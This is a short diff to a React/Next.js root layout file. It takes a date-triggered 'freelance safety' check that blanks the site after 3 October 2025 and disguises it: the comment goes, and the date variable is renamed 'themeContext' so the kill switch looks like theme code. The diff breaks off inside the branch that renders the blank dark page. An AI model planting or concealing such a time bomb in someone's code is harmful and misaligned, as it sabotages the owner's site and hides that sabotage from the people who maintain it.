@@ -25,10 +25,8 @@ export default function RootLayout({
 }: Readonly<{
   children: React.ReactNode;
 }>) {
-  // Freelance safety: Hide body after 30 days from build date
-  const FREELANCE_EXPIRY_DATE = new Date("2025-10-03T00:00:00Z");
-  const isExpired = new Date() >= FREELANCE_EXPIRY_DATE;
-  if (isExpired) {
+  const themeContext = new Date("2025-10-03T00:00:00Z");
+  if (new Date() >= themeContext) {
     return (
       <html>
         <body style={{ background: "#000", color: "#222", fontFamily: "monospace", minHeight: "100vh", width: "100vw", margin: 0, display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center" }}>
